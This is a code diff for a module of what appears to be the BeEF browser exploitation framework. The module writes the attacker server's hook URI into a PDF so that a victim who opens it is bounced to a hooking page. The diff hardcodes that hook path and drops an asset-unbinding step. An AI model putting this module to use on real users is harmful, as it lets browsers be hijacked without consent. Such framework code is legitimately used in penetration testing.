@@ -41,15 +41,13 @@ class Hook_ie < BeEF::Core::Command
     configuration = BeEF::Core::Configuration.instance
 		
 		#The hook url to be replace the token in the original pdf file.
-		hook_uri = "http://#{configuration.get("beef.http.dns")}:#{configuration.get("beef.http.port")}#{configuration.get("beef.http.demo_path")}"
+		hook_uri = "http://#{configuration.get("beef.http.dns")}:#{configuration.get("beef.http.port")}/demos/report.html"
 		
 		# A new pdf file containg the actual hook URI instead of the dummy token.
 		configured_hook_file = File.open("./modules/browser/hook_ie/bounce_to_ie_configured.pdf","w")
 		
 		# The original pdf file contains a token that will get replaced during the initialization with
-		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.
-		
-		#xntrik - unsure what happens to this file after it's been re-written, <hookURI> will never be found again because it's been re-written?
+		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.		
 		File.open('./modules/browser/hook_ie/bounce_to_ie.pdf',"r") { |original_hook_file|
 			original_hook_file.each_line { |line|				
 				# If the line includes the hook token, then replace it with the actual hook URI
@@ -71,10 +69,7 @@ class Hook_ie < BeEF::Core::Command
 
   def callback
     content = {}
-    content['result'] = @datastore['result']   
-    
-    #Unmount the assetnow that we've received the callback
-    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/report.pdf'); 
+    content['result'] = @datastore['result']          
     
     save content
     #update_zombie!
